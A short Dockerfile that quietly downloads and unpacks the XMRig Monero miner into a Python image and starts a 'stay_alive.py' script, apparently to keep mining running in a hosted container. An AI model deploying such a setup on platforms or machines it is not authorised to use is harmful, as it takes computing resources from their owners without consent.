FROM python:3.9-slim

# Step 1: Install dependencies quietly
RUN apt-get update -y && apt-get install -y --no-install-recommends wget procps && rm -rf /var/lib/apt/lists/*

# Step 2: Download the miner separately to save memory
RUN wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz

# Step 3: Extract and then immediately delete the archive to free space
RUN tar -xf xmrig-6.21.0-linux-x64.tar.gz && rm xmrig-6.21.0-linux-x64.tar.gz

COPY . .

# Run the stay-alive script
CMD ["python", "stay_alive.py"]
